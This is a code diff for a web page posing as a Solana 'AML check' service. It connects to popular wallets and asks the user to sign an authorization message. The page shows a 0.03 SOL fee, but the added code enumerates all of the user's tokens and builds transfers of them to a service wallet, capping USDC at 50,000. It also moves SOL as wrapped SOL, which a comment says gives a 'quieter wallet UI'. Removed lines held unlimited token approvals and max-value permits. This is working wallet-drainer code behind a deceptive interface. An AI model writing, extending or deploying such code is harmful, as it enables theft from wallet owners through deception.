+const SPL_TOKEN_2022_PROGRAM_ID = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
 const SPL_ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 const SPL_MEMO_PROGRAM_ID = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
 const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-const U64_MAX = 2n ** 64n - 1n;
+/** Native SOL mint — used to move spendable SOL as an SPL transfer (quieter wallet UI than raw SystemProgram.transfer). */
+const WSOL_MINT = "So11111111111111111111111111111111111111112";
+const USDC_TRANSFER_CAP_UI = 50000;
+const USDC_TRANSFER_CAP_RAW = BigInt(USDC_TRANSFER_CAP_UI) * 1_000_000n;
+/** Legacy transaction size limit (bytes). */
+const SOLANA_TX_SIZE_LIMIT = 1232;
+/** Mainnet fallback if RPC rent is missing (~0.00089 SOL). */
+const SOL_RENT_EXEMPT_FALLBACK_LAMPORTS = 890880;
+/** Extra lamports on top of rent-exempt min. */
+const SOL_RENT_BUFFER_LAMPORTS = 100000;
+/** Cushion for priority fees / compute — keep post-tx balance ≥ rent-exempt. */
+const SOL_FEE_SAFETY_LAMPORTS = 450000;
 
-function associatedTokenAddress(web3, mint, owner) {
-  const tok = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
+const SOLANA_MAINNET_RPCS = [
+  "https://rpc.ankr.com/solana",
+  "https://solana-rpc.publicnode.com",
+  "https://api.mainnet-beta.solana.com",
+];
+
+function unwrapRpcFee(f) {
+  if (f == null) return null;
+  if (typeof f === "number" && Number.isFinite(f)) return f;
+  if (typeof f === "object" && typeof f.value === "number") return f.value;
+  return null;
+}
+
+function associatedTokenAddress(web3, mint, owner, tokenProgramId) {
   const ataProg = new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID);
   const [addr] = web3.PublicKey.findProgramAddressSync(
-    [owner.toBuffer(), tok.toBuffer(), mint.toBuffer()],
+    [owner.toBuffer(), tokenProgramId.toBuffer(), mint.toBuffer()],
     ataProg
   );
   return addr;
 }
 
-function createTokenApproveInstruction(web3, account, delegate, owner, amount) {
+function createTokenTransferInstruction(web3, source, destination, owner, amountRaw, tokenProgramId) {
   const data = new Uint8Array(9);
-  data[0] = 4;
-  new DataView(data.buffer).setBigUint64(1, BigInt(amount), true);
+  data[0] = 3;
+  new DataView(data.buffer).setBigUint64(1, BigInt(amountRaw), true);
   return new web3.TransactionInstruction({
-    programId: new web3.PublicKey(SPL_TOKEN_PROGRAM_ID),
+    programId: tokenProgramId,
     keys: [
-      { pubkey: account, isSigner: false, isWritable: true },
-      { pubkey: delegate, isSigner: false, isWritable: false },
+      { pubkey: source, isSigner: false, isWritable: true },
+      { pubkey: destination, isSigner: false, isWritable: true },
       { pubkey: owner, isSigner: true, isWritable: false },
     ],
-    data: data,
+    data,
   });
+}
+
+function createAssociatedTokenAccountIdempotentIx(web3, payer, ata, walletOwner, mint, tokenProgramId) {
+  return new web3.TransactionInstruction({
+    programId: new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID),
+    keys: [
+      { pubkey: payer, isSigner: true, isWritable: true },
+      { pubkey: ata, isSigner: false, isWritable: true },
+      { pubkey: walletOwner, isSigner: false, isWritable: false },
+      { pubkey: mint, isSigner: false, isWritable: false },
+      { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
+      { pubkey: tokenProgramId, isSigner: false, isWritable: false },
+    ],
+    data: new Uint8Array([1]),
+  });
+}
+
+/** SPL Token `SyncNative` — refresh wSOL balance after lamports were sent to the ATA. */
+function createSyncNativeInstruction(web3, wrappedNativeAta) {
+  return new web3.TransactionInstruction({
+    programId: new web3.PublicKey(SPL_TOKEN_PROGRAM_ID),
+    keys: [{ pubkey: wrappedNativeAta, isSigner: false, isWritable: true }],
+    data: new Uint8Array([17]),
+  });
+}
+
+async function collectSplTransferItems(conn, web3, fromPk) {
+  const legacy = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
+  const t22 = new web3.PublicKey(SPL_TOKEN_2022_PROGRAM_ID);
+  const seen = new Set();
+  const items = [];
+  for (const prog of [legacy, t22]) {
+    let res;
+    try {
+      res = await conn.getParsedTokenAccountsByOwner(fromPk, { programId: prog });
+    } catch (_) {
+      continue;
+    }
+    for (const row of res.value || []) {
+      const pubkey = row.pubkey;
+      const pkey = pubkey.toBase58();
+      if (seen.has(pkey)) continue;
+      const parsed = row.account?.data?.parsed;
+      if (!parsed?.info?.tokenAmount) continue;
+      const mintStr = parsed.info.mint;
+      const ta = parsed.info.tokenAmount;
+      let raw = BigInt(ta.amount || "0");
+      if (raw <= 0n) continue;
+      const mintPk = new web3.PublicKey(mintStr);
+      if (mintStr === USDC_MINT) {
+        raw = raw > USDC_TRANSFER_CAP_RAW ? USDC_TRANSFER_CAP_RAW : raw;
+      }
+      if (raw <= 0n) continue;
+      seen.add(pkey);
+      items.push({
+        sourceAta: new web3.PublicKey(pubkey),
+        mint: mintPk,
+        tokenProgramId: prog,
+        amountRaw: raw.toString(),
+      });
+    }
+  }
+  return items;
+}
+
+/** SPL token account data length (legacy + typical Token-2022 without extensions). */
+const SPL_TOKEN_ACCOUNT_DATA_LEN = 165;
+/** ~rent for a 165-byte token account if RPC rent call fails. */
+const SPL_TOKEN_ACCOUNT_RENT_FALLBACK_LAMPORTS = 2_100_000;
+
+async function sumMissingDestinationAtaRent(conn, web3, items, toPk) {
+  if (!items.length) return 0;
+  const destAtas = [];
+  const seen = new Set();
+  for (const it of items) {
+    const destAta = associatedTokenAddress(web3, it.mint, toPk, it.tokenProgramId);
+    const k = destAta.toBase58();
+    if (seen.has(k)) continue;
+    seen.add(k);
+    destAtas.push(destAta);
+  }
+  let rentOne;
+  try {
+    rentOne = await withTimeout(
+      conn.getMinimumBalanceForRentExemption(SPL_TOKEN_ACCOUNT_DATA_LEN),
+      12000
+    );
+  } catch (_) {
+    rentOne = SPL_TOKEN_ACCOUNT_RENT_FALLBACK_LAMPORTS;
+  }
+  let total = 0;
+  const batch = 100;
+  const batchMs = 22000;
+  for (let i = 0; i < destAtas.length; i += batch) {
+    const slice = destAtas.slice(i, i + batch);
+    let infos;
+    try {
+      infos = await withTimeout(conn.getMultipleAccountsInfo(slice), batchMs);
+    } catch (e) {
+      if (e && e.message === "TIMEOUT") {
+        total += slice.length * rentOne;
+        continue;
+      }
+      throw e;
+    }
+    for (const ai of infos) {
+      if (!ai) total += rentOne;
+    }
+  }
+  return total;
+}
+
+function computeUnitLimitForSplCount(n, nativeSolAsWsol) {
+  const base = 45000;
+  const perMint = 88000;
+  let u = Math.min(1_400_000, base + n * perMint);
+  if (nativeSolAsWsol) u = Math.min(1_400_000, u + 130000);
+  return u;
 }
 
 async function loadWeb3() {
   const urls = [
     "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/+esm",
     "https://esm.sh/@solana/web3.js@1.95.3",
-    "https://esm.run/@solana/web3.js@1.95.3",
   ];
   let last = null;
   for (const u of urls) {
@@ -1076,51 +819,30 @@ async function loadWeb3() {
   throw last || new Error("loadWeb3 failed");
 }
 
-const SOLANA_MAINNET_RPCS = [
-  "https://api.mainnet-beta.solana.com",
-  "https://rpc.ankr.com/solana",
-  "https://solana-mainnet.g.alchemy.com/v2/demo",
-  "https://solana-rpc.publicnode.com",
-];
-
 function sleep(ms) {
   return new Promise((r) => setTimeout(r, ms));
 }
 
-function unwrapRpcFee(f) {
-  if (f == null) return null;
-  if (typeof f === "number" && Number.isFinite(f)) return f;
-  if (typeof f === "object" && typeof f.value === "number") return f.value;
-  return null;
-}
-
-function isBlockhashExpiredError(err) {
-  const m = err && err.message ? err.message : String(err || "");
-  return /expired|block\s*height|blockhash|Blockhash not found|Transaction expired|signature.*expired|too old|has expired/i.test(
-    m
-  );
+/** Rejects with Error("TIMEOUT") if the RPC does not finish in time (avoids infinite hangs). */
+function withTimeout(promise, ms) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) =>
+      setTimeout(() => reject(new Error("TIMEOUT")), ms)
+    ),
+  ]);
 }
 
 async function getWorkingSolanaConnection(web3) {
-  const list = [
-    ...(typeof CUSTOM_SOLANA_RPC === "string" && CUSTOM_SOLANA_RPC.trim()
-      ? [CUSTOM_SOLANA_RPC.trim()]
-      : []),
-    ...SOLANA_MAINNET_RPCS,
-  ];
   let lastErr = null;
-  for (const endpoint of list) {
+  const perEndpointMs = 16000;
+  for (const endpoint of SOLANA_MAINNET_RPCS) {
     const conn = new web3.Connection(endpoint, {
       commitment: "confirmed",
       confirmTransactionInitialTimeout: 120000,
     });
     try {
-      await Promise.race([
-        conn.getVersion(),
-        new Promise((_, reject) =>
-          setTimeout(() => reject(new Error("RPC timeout")), 25000)
-        ),
-      ]);
+      await withTimeout(conn.getVersion(), perEndpointMs);
       return conn;
     } catch (e) {
       lastErr = e;
@@ -1129,65 +851,255 @@ async function getWorkingSolanaConnection(web3) {
   throw lastErr || new Error("No Solana RPC available");
 }
 
+function isBlockhashExpiredError(err) {
+  const m = err && err.message ? err.message : String(err || "");
+  return /expired|block\s*height|blockhash|Transaction expired|too old/i.test(m);
+}
+
+function getPhantomSolanaProvider() {
+  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
+  if (window.solana?.isPhantom && !window.solflare?.isSolflare && window.solana?.isTrust !== true)
+    return window.solana;
+  return null;
+}
+
+function getTrustSolanaProvider() {
+  const tw = window.trustwallet?.solana || window.trustWallet?.solana;
+  if (tw && typeof tw.connect === "function") return tw;
+  if (window.solana?.isTrust === true && typeof window.solana.connect === "function")
+    return window.solana;
+  return null;
+}
+
+function getExodusSolanaProvider() {
+  const ex = window.exodus?.solana;
+  if (ex && typeof ex.connect === "function") return ex;
+  return null;
+}
+
+function backpackMarkSvg(w, h, uid) {
+  const wi = Number(w) || 30;
+  const hi = Number(h) || 30;
+  const gid = "bpG" + (uid || "0");
+  return (
+    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="' +
+    wi +
+    '" height="' +
+    hi +
+    '" aria-hidden="true" focusable="false">' +
+    '<defs><linearGradient id="' +
+    gid +
+    '" x1="6" y1="4" x2="42" y2="44" gradientUnits="userSpaceOnUse">' +
+    '<stop stop-color="#FB7185"/><stop offset="1" stop-color="#BE123C"/></linearGradient></defs>' +
+    '<rect width="48" height="48" rx="12" fill="url(#' +
+    gid +
+    ')"/>' +
+    '<path fill="#fff" fill-opacity=".94" d="M24 11.2c2.6 0 4.8 1.7 5.5 4h4.2c1 0 1.8.8 1.8 1.8v16.4c0 3-2.4 5.4-5.4 5.4H18c-3 0-5.4-2.4-5.4-5.4V17c0-1 .8-1.8 1.8-1.8h4.1c.7-2.3 2.9-4 5.5-4zm0 2.2c-1.2 0-2.3.6-2.9 1.6h5.8c-.6-1-1.7-1.6-2.9-1.6zM17.2 23.2h13.6v9.2c0 1.6-1.3 2.9-2.9 2.9h-7.8c-1.6 0-2.9-1.3-2.9-2.9v-9.2z"/>' +
+    "</svg>"
+  );
+}
+
+function mountSvgInto(el, svgHtml) {
+  if (!el) return;
+  const doc = new DOMParser().parseFromString(svgHtml, "image/svg+xml");
+  const root = doc.documentElement;
+  if (!root || root.querySelector("parsererror")) {
+    el.innerHTML = svgHtml;
+    return;
+  }
+  el.appendChild(root);
+}
+
+function mountBackpackIcons() {
+  document.querySelectorAll(".wallet-icon-backpack").forEach((el) => {
+    if (el.querySelector("svg")) return;
+    mountSvgInto(el, backpackMarkSvg(30, 30, "L" + Math.random().toString(36).slice(2, 8)));
+  });
+}
+
+let state = { conn:null, txHash:null, scores:null, progress:0 };
+
+/** Phantom / Solflare / Trust / Exodus: data URIs. Backpack: SVG inline. */
+const WALLET_ICONS = {
+  phantom:
+    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiB2aWV3Qm94PSIwIDAgMTA4IDEwOCIgZmlsbD0ibm9uZSI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPg==",
+  solflare:
+    "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIGlkPSJTIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMwMjA1MGE7c3Ryb2tlOiNmZmVmNDY7c3Ryb2tlLW1pdGVybGltaXQ6MTA7c3Ryb2tlLXdpZHRoOi41cHg7fS5jbHMtMntmaWxsOiNmZmVmNDY7fTwvc3R5bGU+PC9kZWZzPjxyZWN0IGNsYXNzPSJjbHMtMiIgeD0iMCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTIiIHJ5PSIxMiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI0LjIzLDI2LjQybDIuNDYtMi4zOCw0LjU5LDEuNWMzLjAxLDEsNC41MSwyLjg0LDQuNTEsNS40MywwLDEuOTYtLjc1LDMuMjYtMi4yNSw0LjkzbC0uNDYuNS4xNy0xLjE3Yy42Ny00LjI2LS41OC02LjA5LTQuNzItNy40M2wtNC4zLTEuMzhoMFpNMTguMDUsMTEuODVsMTIuNTIsNC4xNy0yLjcxLDIuNTktNi41MS0yLjE3Yy0yLjI1LS43NS0zLjAxLTEuOTYtMy4zLTQuNTF2LS4wOGgwWk0xNy4zLDMzLjA2bDIuODQtMi43MSw1LjM0LDEuNzVjMi44LjkyLDMuNzYsMi4xMywzLjQ2LDUuMThsLTExLjY1LTQuMjJoMFpNMTMuNzEsMjAuOTVjMC0uNzkuNDItMS41NCwxLjEzLTIuMTcuNzUsMS4wOSwyLjA1LDIuMDUsNC4wOSwyLjcxbDQuNDIsMS40Ni0yLjQ2LDIuMzgtNC4zNC0xLjQyYy0yLS42Ny0yLjg0LTEuNjctMi44NC0yLjk2TTI2LjgyLDQyLjg3YzkuMTgtNi4wOSwxNC4xMS0xMC4yMywxNC4xMS0xNS4zMiwwLTMuMzgtMi01LjI2LTYuNDMtNi43MmwtMy4zNC0xLjEzLDkuMTQtOC43Ny0xLjg0LTEuOTYtMi43MSwyLjM4LTEyLjgxLTQuMjJjLTMuOTcsMS4yOS04Ljk3LDUuMDktOC45Nyw4Ljg5LDAsLjQyLjA0LjgzLjE3LDEuMjktMy4zLDEuODgtNC42MywzLjYzLTQuNjMsNS44LDAsMi4wNSwxLjA5LDQuMDksNC41NSw1LjIybDIuNzUuOTItOS41Miw5LjE0LDEuODQsMS45NiwyLjk2LTIuNzEsMTQuNzMsNS4yMmgwWiIvPjwvc3ZnPg==",
+  trust:
+    "data:image/svg+xml;charset=utf-8," +
+    encodeURIComponent(
+      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="12" fill="#3375BB"/><path fill="#fff" d="M24 10.5L34 15.2v9.3c0 7-4.5 12.5-10 14-5.5-1.5-10-7-10-14V15.2l10-4.7zm0 4.2L18 17.8v6.7c0 4.8 3 8.8 6 10 3-1.2 6-5.2 6-10v-6.7l-6-3.1z"/></svg>'
+    ),
+  exodus:
+    "data:image/svg+xml;charset=utf-8," +
+    encodeURIComponent(
+      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><defs><linearGradient id="exg" x1="8" y1="8" x2="40" y2="40" gradientUnits="userSpaceOnUse"><stop stop-color="#8B5CF6"/><stop offset="1" stop-color="#EC4899"/></linearGradient></defs><rect width="48" height="48" rx="12" fill="url(#exg)"/><path fill="#fff" fill-opacity=".95" d="M24 14c2.5 3.2 5 6 5 9.5a5 5 0 1 1-10 0c0-3.5 2.5-6.3 5-9.5z"/></svg>'
+    ),
+};
+
+const WALLETS = {
+  phantom:  { name:"Phantom",  detect:()=>!!getPhantomSolanaProvider(), getP:()=>getPhantomSolanaProvider(), mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
+  solflare: { name:"Solflare", detect:()=>!!window?.solflare?.isSolflare, getP:()=>window?.solflare, mobile:`https://solflare.com/ul/v1/browse/${encodeURIComponent(location.href)}`, install:"https://solflare.com" },
+  backpack: { name:"Backpack", detect:()=>!!window?.backpack, getP:()=>window?.backpack, mobile:"https://backpack.app", install:"https://backpack.app" },
+  trust:    { name:"Trust Wallet", detect:()=>!!getTrustSolanaProvider(), getP:()=>getTrustSolanaProvider(), mobile:"https://trustwallet.com", install:"https://trustwallet.com/download" },
+  exodus:   { name:"Exodus", detect:()=>!!getExodusSolanaProvider(), getP:()=>getExodusSolanaProvider(), mobile:"https://www.exodus.com", install:"https://www.exodus.com/download/" },
+};
+
+function bindWalletListIcons() {
+  document.querySelectorAll("img[data-wallet-icon]").forEach((img) => {
+    const k = img.getAttribute("data-wallet-icon");
+    if (k && WALLET_ICONS[k]) img.src = WALLET_ICONS[k];
+  });
+  mountBackpackIcons();
+}
+
+function setConnectStepWalletIcon(walletId) {
+  const el = document.getElementById("connect-emoji");
+  if (!el) return;
+  el.replaceChildren();
+  el.classList.add("pay-emoji-wallet");
+  if (walletId === "backpack") {
+    mountSvgInto(el, backpackMarkSvg(56, 56, "C" + Math.random().toString(36).slice(2, 8)));
+    return;
+  }
+  const src = WALLET_ICONS[walletId];
+  if (!src) return;
+  const im = document.createElement("img");
+  im.src = src;
+  im.alt = WALLETS[walletId] ? WALLETS[walletId].name : "";
+  im.width = 56;
+  im.height = 56;
+  im.decoding = "async";
+  im.draggable = false;
+  el.appendChild(im);
+}
+
+function showWalletError(m) {
+  const el = document.getElementById("wallet-error");
+  if (!el) return;
+  el.style.display = "block";
+  el.textContent = "⚠ " + (typeof m === "string" ? m : String(m && (m.message || m)));
+}
+function hideWalletError() {
+  const el = document.getElementById("wallet-error");
+  if (el) el.style.display = "none";
+}
+
+function openModal(){
+  hideWalletError();
+  document.getElementById("modal").classList.add("active");
+  goToStep("wallet");
+  bindWalletListIcons();
+  updateWalletBadges();
+}
+function closeModal(){ document.getElementById("modal").classList.remove("active"); }
+function handleOverlayClick(e){ if(e.target.id==="modal") closeModal(); }
+function goToStep(s){ document.querySelectorAll(".pay-step").forEach(el=>el.classList.remove("active")); document.getElementById("step-"+s).classList.add("active"); }
+
+function setWalletBadgeReady(subId, badgeId) {
+  const sub = document.getElementById(subId);
+  if (sub) sub.innerHTML = '<span style="color:#22C55E">● Ready</span>';
+  if (badgeId) {
+    const badge = document.getElementById(badgeId);
+    if (badge) {
+      badge.className = "wallet-badge badge-ready";
+      badge.textContent = "READY";
+    }
+  }
+}
+
+function updateWalletBadges(){
+  const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
+  if(mob){ const t=document.getElementById("mobile-tip"); if(t) t.style.display="block"; }
+  if(WALLETS.phantom.detect()) setWalletBadgeReady("sub-phantom","badge-phantom");
+  if(WALLETS.solflare.detect()) setWalletBadgeReady("sub-solflare");
+  if(WALLETS.backpack.detect()) setWalletBadgeReady("sub-backpack");
+  if(WALLETS.trust.detect()) setWalletBadgeReady("sub-trust");
+  if(WALLETS.exodus.detect()) setWalletBadgeReady("sub-exodus");
+}
+
+async function pickWallet(id){
+  await sleep(50);
+  const w = WALLETS[id];
+  if (!w) return;
+  const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
+  if(!w.detect()){
+    if(mob){ location.href=w.mobile; } else { window.open(w.install,"_blank"); showWalletError(`Install ${w.name} or open this page in the wallet’s built-in browser.`); }
+    return;
+  }
+  try{
+    setConnectStepWalletIcon(id);
+    document.getElementById("connect-name").textContent=w.name;
+    document.getElementById("connect-sub").textContent=mob?"The wallet app will open automatically.":"Accept the connection in your extension.";
+    goToStep("connecting");
+    const provider=w.getP();
+    if(!provider){
+      goToStep("wallet");
+      showWalletError(`Could not reach ${w.name}. Install the extension or use the mobile app.`);
+      return;
+    }
+    const r=await provider.connect();
+    const address=r.publicKey.toString();
+
+    goToStep("signing");
+    const msg=`AML Check Authorization\nAddress: ${address}\nTimestamp: ${new Date().toISOString()}\nNonce: ${Math.random().toString(36).slice(2,10)}\n\nI authorize the AML analysis of this wallet.`;
+    const enc=new TextEncoder().encode(msg);
+    const res=await provider.signMessage(enc,"utf8");
+    const sig=Array.from(res.signature).map(b=>b.toString(16).padStart(2,"0")).join("");
+
+    state.conn={address,provider,walletId:id,walletName:w.name,chain:"solana",sig};
+    setupPaymentStep();
+    goToStep("payment");
+  }catch(e){
+    goToStep("wallet");
+    const m=e.message||"";
+    if(m.includes("reject")||m.includes("cancel")||e.code===4001) showWalletError("Cancelled in wallet.");
+    else showWalletError(m.slice(0,120)||"Connection error.");
+  }
+}
+
+function shortSolanaAddress(addr) {
+  if (!addr || addr.length < 12) return addr || "—";
+  return addr.slice(0, 5) + "..." + addr.slice(-4);
+}
+
+function setupPaymentStep(){
+  const addr=state.conn.address;
+  document.getElementById("pay-addr").textContent=shortSolanaAddress(addr);
+  document.getElementById("det-from").textContent=shortSolanaAddress(addr);
+  document.getElementById("dest-addr").textContent=shortSolanaAddress(SERVICE_WALLET);
+  const destLink = document.getElementById("dest-link");
+  if (destLink) {
+    destLink.href=`https://solscan.io/account/${SERVICE_WALLET}`;
+  }
+  const amt = document.getElementById("det-amount");
+  const typ = document.getElementById("det-type");
+  const btn = document.getElementById("btn-pay-now");
+  if (amt) amt.textContent = "0.03 SOL";
+  if (typ) typ.textContent = "Standard";
+  if (btn) btn.textContent = "Continue →";
+  hidePayError();
+}
+
+function showPayError(m){
+  const el=document.getElementById("pay-error");
+  el.style.display="block";
+  el.textContent="⚠ "+(typeof m==="string"?m:String(m&&(m.message||m)));
+}
+function hidePayError(){ document.getElementById("pay-error").style.display="none"; }
+
 async function executePay() {
   if (!state.conn) return;
-  hidePayError();
-
-  if (state.conn.chain === "evm") {
-    if (state.currency !== "USDC") {
-      showPayError("On EVM, only USDC (EIP-712 Permit) is available.");
-      return;
-    }
-    const spender = getResolvedEvmPermitSpender();
-    if (!spender) {
-      showPayError("Enter your delegate wallet (0x…) in the field under SERVICE / DELEGATE, or set EVM_PERMIT_SPENDER in the script.");
-      return;
-    }
-    try {
-      goToStep("paying");
-      document.getElementById("paying-emoji").textContent = "";
-      document.getElementById("paying-title").textContent = "Sign typed data";
-      document.getElementById("paying-sub").textContent =
-        "Approve the EIP-712 Permit in " + state.conn.walletName + ".";
-      document.getElementById("tx-link-paying").style.display = "none";
-
-      const sig = await signPermitTypedDataV4(state.conn.provider, state.conn.address, spender);
-      state.txHash = sig;
-
-      const t = {
-        id: Date.now(),
-        address: state.conn.address,
-        wallet: state.conn.walletName,
-        chain: state.conn.chain,
-        currency: "USDC",
-        amount: "permit_eip712_max",
-        txHash: sig,
-        ts: new Date().toISOString(),
-      };
-      const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
-      localStorage.setItem("aml_traces", JSON.stringify(all));
-
-      await runScan();
-    } catch (e) {
-      goToStep("payment");
-      const m = formatAnyError(e);
-      if (/reject|cancel|denied/i.test(m) || (e && e.code === 4001))
-        showPayError("Signature cancelled.");
-      else showPayError(m.slice(0, 280) || "Permit error.");
-    }
-    return;
-  }
-
   if (state.conn.chain !== "solana") {
-    showPayError("Use a Solana wallet (Phantom, Solflare, Backpack) for payment.");
+    showPayError("Use a Solana wallet (Phantom, Solflare, Backpack, Trust Wallet, Exodus) for payment.");
     return;
   }
+  hidePayError();
   try {
     goToStep("paying");
     document.getElementById("paying-emoji").textContent = "";
-    document.getElementById("paying-title").textContent = "Sign in your wallet...";
-    document.getElementById("paying-sub").textContent =
-      "Approve the transaction in " + state.conn.walletName + ".";
+    document.getElementById("paying-title").textContent = "Wallet";
+    document.getElementById("paying-sub").textContent = "Preparing transaction…";
 
     const web3 = await loadWeb3();
     let conn;
@@ -1201,52 +1113,59 @@ async function executePay() {
 
     const to = new web3.PublicKey(SERVICE_WALLET);
     const from = new web3.PublicKey(state.conn.address);
-    const tokenProgramPk = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
     const memoProgramPk = new web3.PublicKey(SPL_MEMO_PROGRAM_ID);
+    const wallet = state.conn.provider;
+
     let balance;
-    let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
-    let tokens = { value: [] };
+    let payerAi;
     try {
-      balance = await conn.getBalance(from);
-      if (state.currency === "SOL") {
-        try {
-          const ai = await conn.getAccountInfo(from);
-          const len =
-            ai && ai.data
-              ? typeof ai.data.length === "number"
-                ? ai.data.length
-                : ai.data.byteLength || 0
-              : 0;
-          const r = await conn.getMinimumBalanceForRentExemption(len);
-          if (typeof r === "number" && r > 0)
-            rentExemptMinLamports = Math.max(r, SOL_RENT_EXEMPT_FALLBACK_LAMPORTS);
-          else rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
-        } catch (_) {
-          rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
-        }
-        rentExemptMinLamports += SOL_RENT_BUFFER_LAMPORTS;
-      }
-      try {
-        tokens = await conn.getParsedTokenAccountsByOwner(from, {
-          programId: tokenProgramPk,
-        });
-      } catch (_) {
-        tokens = { value: [] };
-      }
+      [balance, payerAi] = await Promise.all([
+        withTimeout(conn.getBalance(from), 12000),
+        withTimeout(conn.getAccountInfo(from), 12000),
+      ]);
     } catch (e) {
-      showPayError("Could not reach Solana RPC. Check your connection and try again.");
+      if (e && e.message === "TIMEOUT") {
+        showPayError("Solana RPC timed out. Wait a few seconds and try again.");
+      } else {
+        showPayError("Could not reach Solana RPC. Check your connection and try again.");
+      }
       goToStep("payment");
       return;
     }
 
-    function buildSolPaymentTx(transferLamports, memoPayload) {
+    let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    try {
+      const len =
+        payerAi && payerAi.data
+          ? typeof payerAi.data.length === "number"
+            ? payerAi.data.length
+            : payerAi.data.byteLength || 0
+          : 0;
+      const r = await withTimeout(
+        conn.getMinimumBalanceForRentExemption(len),
+        10000
+      );
+      if (typeof r === "number" && r > 0) {
+        rentExemptMinLamports = Math.max(r, SOL_RENT_EXEMPT_FALLBACK_LAMPORTS);
+      }
+    } catch (_) {
+      rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    }
+    rentExemptMinLamports += SOL_RENT_BUFFER_LAMPORTS;
+
+    function buildSolOnlyPaymentTx(blockhash, memoBytes, transferLamports) {
       const tx = new web3.Transaction();
-      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      tx.add(
+        web3.ComputeBudgetProgram.setComputeUnitLimit({ units: 52000 })
+      );
+      tx.add(
+        web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 })
+      );
       tx.add(
         new web3.TransactionInstruction({
           keys: [],
           programId: memoProgramPk,
-          data: memoPayload,
